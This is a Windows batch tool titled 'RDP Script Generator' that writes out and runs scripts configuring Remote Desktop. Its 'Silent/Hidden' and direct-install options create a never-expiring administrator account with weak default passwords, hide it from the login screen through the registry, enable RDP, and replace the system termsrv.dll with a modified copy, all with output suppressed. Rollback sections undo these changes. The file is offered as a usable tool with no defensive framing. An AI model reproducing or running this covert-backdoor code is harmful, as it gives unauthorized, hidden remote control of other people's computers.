@echo off
:: =============================================
:: RDP Script Generator
:: Version: 2.1
:: =============================================

:MAIN_MENU
cls
echo =============================================
echo    RDP Script Generator v2.1
echo =============================================
echo.
echo Select script type to generate:
echo.
echo [1] Generate Silent/Hidden Script (No logs, instant execution)
echo [2] Generate Normal Script (With logs and feedback)
echo [3] Generate Rollback Script
echo [4] Run Direct Installation (Current session only)
echo [5] Run Direct Rollback (Current session only)
echo [6] Exit
echo.
set /p choice="Enter your choice (1-6): "

if "%choice%"=="1" goto CREATE_SILENT
if "%choice%"=="2" goto CREATE_NORMAL
if "%choice%"=="3" goto CREATE_ROLLBACK
if "%choice%"=="4" goto DIRECT_INSTALL
if "%choice%"=="5" goto DIRECT_ROLLBACK
if "%choice%"=="6" goto EXIT_SCRIPT
echo Invalid choice. Please try again.
pause
goto MAIN_MENU

:CREATE_SILENT
cls
echo Creating Silent/Hidden RDP Script...
echo.
set /p username="Enter username for hidden account (default: WindowsUser): "
if "%username%"=="" set username=WindowsUser
set /p password="Enter password (default: Pass123!): "
if "%password%"=="" set password=Pass123!

echo @echo off > RDP_Silent.bat
echo NET SESSION ^>nul 2^>^&1 >> RDP_Silent.bat
echo IF %%ERRORLEVEL%% NEQ 0 exit /b 1 >> RDP_Silent.bat
echo net user %username% %password% /ADD /Y /EXPIRES:NEVER ^>nul 2^>^&1 >> RDP_Silent.bat
echo net localgroup Administrators %username% /ADD ^>nul 2^>^&1 >> RDP_Silent.bat
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ^>nul 2^>^&1 >> RDP_Silent.bat
echo REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f ^>nul 2^>^&1 >> RDP_Silent.bat
echo if exist termsrv.dll ( >> RDP_Silent.bat
echo takeown /f "%%windir%%\System32\termsrv.dll" ^>nul 2^>^&1 >> RDP_Silent.bat
echo icacls "%%windir%%\System32\termsrv.dll" /grant Administrators:F ^>nul 2^>^&1 >> RDP_Silent.bat
echo copy termsrv.dll "%%windir%%\System32\termsrv.dll" /Y ^>nul 2^>^&1 >> RDP_Silent.bat
echo ) >> RDP_Silent.bat
echo net stop TermService /Y ^>nul 2^>^&1 >> RDP_Silent.bat
echo net start TermService ^>nul 2^>^&1 >> RDP_Silent.bat
echo exit /b 0 >> RDP_Silent.bat

echo.
echo =============================================
echo Silent Script Created: RDP_Silent.bat
echo =============================================
echo Username: %username%
echo Password: %password%
echo.
echo This script will:
echo - Run completely silently (no output)
echo - Create hidden admin account
echo - Enable RDP instantly
echo - Exit automatically
echo =============================================
pause
goto MAIN_MENU

:CREATE_NORMAL
cls
echo Creating Normal RDP Script with Logging...
echo.
set /p username="Enter username for account (default: RDPAdmin): "
if "%username%"=="" set username=RDPAdmin
set /p password="Enter password (default: SecurePass123!): "
if "%password%"=="" set password=SecurePass123!

echo @echo off > RDP_Normal.bat
echo :: ============================================= >> RDP_Normal.bat
echo :: RDP Configuration Script ^(Normal Mode^) >> RDP_Normal.bat
echo :: ============================================= >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo SET LOG_FILE=%%SystemDrive%%\RDP_Config_%%DATE:~-4,4%%%%DATE:~-10,2%%%%DATE:~-7,2%%.log >> RDP_Normal.bat
echo SET BACKUP_DIR=%%SystemDrive%%\RDP_Backup_%%TIME:~0,2%%%%TIME:~3,2%%%%TIME:~6,2%% >> RDP_Normal.bat
echo SET TEMP_USER=%username% >> RDP_Normal.bat
echo SET TEMP_PASSWORD=%password% >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo [%%DATE%% %%TIME%%] Starting RDP configuration ^>^> %%LOG_FILE%% >> RDP_Normal.bat
echo echo Configuring RDP access... >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo NET SESSION ^>nul 2^>^&1 >> RDP_Normal.bat
echo IF %%ERRORLEVEL%% NEQ 0 ^( >> RDP_Normal.bat
echo     echo ERROR: Administrator privileges required. >> RDP_Normal.bat
echo     pause >> RDP_Normal.bat
echo     exit /b 1 >> RDP_Normal.bat
echo ^) >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo Creating backup directory... >> RDP_Normal.bat
echo mkdir "%%BACKUP_DIR%%" ^>nul 2^>^&1 >> RDP_Normal.bat
echo if exist "%%windir%%\System32\termsrv.dll" copy "%%windir%%\System32\termsrv.dll" "%%BACKUP_DIR%%\termsrv.dll.backup" ^>nul 2^>^&1 >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo Creating user account... >> RDP_Normal.bat
echo net user %%TEMP_USER%% %%TEMP_PASSWORD%% /ADD /Y /EXPIRES:NEVER /COMMENT:"RDP Access Account" ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo net localgroup Administrators %%TEMP_USER%% /ADD ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo Enabling RDP connections... >> RDP_Normal.bat
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo Configuring user visibility... >> RDP_Normal.bat
echo REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %%TEMP_USER%% /t REG_DWORD /d 0 /f ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo if exist termsrv.dll ^( >> RDP_Normal.bat
echo     echo Deploying modified DLL... >> RDP_Normal.bat
echo     takeown /f "%%windir%%\System32\termsrv.dll" ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo     icacls "%%windir%%\System32\termsrv.dll" /grant Administrators:F ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo     copy termsrv.dll "%%windir%%\System32\termsrv.dll" /Y ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo ^) >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo Restarting Terminal Services... >> RDP_Normal.bat
echo net stop TermService /Y ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo net start TermService ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
echo. >> RDP_Normal.bat
echo echo ============================================= >> RDP_Normal.bat
echo echo RDP Configuration Complete >> RDP_Normal.bat
echo echo ============================================= >> RDP_Normal.bat
echo echo Username: %%TEMP_USER%% >> RDP_Normal.bat
echo echo Log file: %%LOG_FILE%% >> RDP_Normal.bat
echo echo Backup: %%BACKUP_DIR%% >> RDP_Normal.bat
echo echo ============================================= >> RDP_Normal.bat
echo pause >> RDP_Normal.bat

echo.
echo =============================================
echo Normal Script Created: RDP_Normal.bat
echo =============================================
echo Username: %username%
echo Password: %password%
echo.
echo This script will:
echo - Show progress messages
echo - Create detailed logs
echo - Create file backups
echo - Display completion status
echo =============================================
pause
goto MAIN_MENU

:CREATE_ROLLBACK
cls
echo Creating Rollback Script...

echo @echo off > RDP_Rollback.bat
echo :: ============================================= >> RDP_Rollback.bat
echo :: RDP Configuration Rollback Script >> RDP_Rollback.bat
echo :: ============================================= >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo Rolling back RDP configuration... >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo NET SESSION ^>nul 2^>^&1 >> RDP_Rollback.bat
echo IF %%ERRORLEVEL%% NEQ 0 ^( >> RDP_Rollback.bat
echo     echo ERROR: Administrator privileges required. >> RDP_Rollback.bat
echo     pause >> RDP_Rollback.bat
echo     exit /b 1 >> RDP_Rollback.bat
echo ^) >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo Disabling RDP connections... >> RDP_Rollback.bat
echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f ^>nul 2^>^&1 >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo Removing user accounts... >> RDP_Rollback.bat
echo for /f "delims=" %%%%i in ^('net user ^| findstr /i "WindowsUser RDPAdmin RDPTempAdmin"'^) do ^( >> RDP_Rollback.bat
echo     net user %%%%i /DELETE ^>nul 2^>^&1 >> RDP_Rollback.bat
echo ^) >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo Cleaning registry entries... >> RDP_Rollback.bat
echo REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WindowsUser /f ^>nul 2^>^&1 >> RDP_Rollback.bat
echo REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPAdmin /f ^>nul 2^>^&1 >> RDP_Rollback.bat
echo REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPTempAdmin /f ^>nul 2^>^&1 >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo Restoring original files... >> RDP_Rollback.bat
echo for /d %%%%i in ^(%%SystemDrive%%\RDP_Backup_*^) do ^( >> RDP_Rollback.bat
echo     if exist "%%%%i\termsrv.dll.backup" ^( >> RDP_Rollback.bat
echo         takeown /f "%%windir%%\System32\termsrv.dll" ^>nul 2^>^&1 >> RDP_Rollback.bat
echo         icacls "%%windir%%\System32\termsrv.dll" /grant Administrators:F ^>nul 2^>^&1 >> RDP_Rollback.bat
echo         copy "%%%%i\termsrv.dll.backup" "%%windir%%\System32\termsrv.dll" /Y ^>nul 2^>^&1 >> RDP_Rollback.bat
echo     ^) >> RDP_Rollback.bat
echo ^) >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo Restarting services... >> RDP_Rollback.bat
echo net stop TermService /Y ^>nul 2^>^&1 >> RDP_Rollback.bat
echo net start TermService ^>nul 2^>^&1 >> RDP_Rollback.bat
echo. >> RDP_Rollback.bat
echo echo ============================================= >> RDP_Rollback.bat
echo echo RDP Rollback Complete >> RDP_Rollback.bat
echo echo ============================================= >> RDP_Rollback.bat
echo pause >> RDP_Rollback.bat

echo.
echo =============================================
echo Rollback Script Created: RDP_Rollback.bat
echo =============================================
echo This script will:
echo - Disable RDP connections
echo - Remove all created user accounts
echo - Clean registry entries
echo - Restore original system files
echo =============================================
pause
goto MAIN_MENU

:DIRECT_INSTALL
cls
echo =============================================
echo Direct Installation (Current Session)
echo =============================================
echo.
set /p username="Enter username (default: QuickRDP): "
if "%username%"=="" set username=QuickRDP
set /p password="Enter password (default: Quick123!): "
if "%password%"=="" set password=Quick123!

echo Checking administrator privileges...
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo ERROR: Administrator privileges required.
    pause
    goto MAIN_MENU
)

echo Creating user account...
net user %username% %password% /ADD /Y /EXPIRES:NEVER >nul 2>&1
net localgroup Administrators %username% /ADD >nul 2>&1

echo Enabling RDP...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f >nul 2>&1

if exist termsrv.dll (
    echo Deploying modified DLL...
    takeown /f "%windir%\System32\termsrv.dll" >nul 2>&1
    icacls "%windir%\System32\termsrv.dll" /grant Administrators:F >nul 2>&1
    copy termsrv.dll "%windir%\System32\termsrv.dll" /Y >nul 2>&1
)

echo Restarting services...
net stop TermService /Y >nul 2>&1
net start TermService >nul 2>&1

echo.
echo =============================================
echo Direct Installation Complete
echo =============================================
echo Username: %username%
echo Password: %password%
echo RDP is now enabled with hidden account
echo =============================================
pause
goto MAIN_MENU

:DIRECT_ROLLBACK
cls
echo =============================================
echo Direct Rollback (Current Session)
echo =============================================
echo.

echo Checking administrator privileges...
NET SESSION >nul 2>&1
IF %ERRORLEVEL% NEQ 0 (
    echo ERROR: Administrator privileges required.
    pause
    goto MAIN_MENU
)

echo Disabling RDP...
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f >nul 2>&1

echo Removing user accounts...
for /f "delims=" %%i in ('net user ^| findstr /i "WindowsUser RDPAdmin RDPTempAdmin QuickRDP"') do (
    net user %%i /DELETE >nul 2>&1
)

echo Cleaning registry...
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WindowsUser /f >nul 2>&1
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPAdmin /f >nul 2>&1
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPTempAdmin /f >nul 2>&1
REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v QuickRDP /f >nul 2>&1

echo Restarting services...
net stop TermService /Y >nul 2>&1
net start TermService >nul 2>&1

echo.
echo =============================================
echo Direct Rollback Complete
echo =============================================
echo RDP has been disabled and accounts removed
echo =============================================
pause
goto MAIN_MENU

:EXIT_SCRIPT
echo.
echo Exiting RDP Script Generator...
echo.
pause
exit /b 0
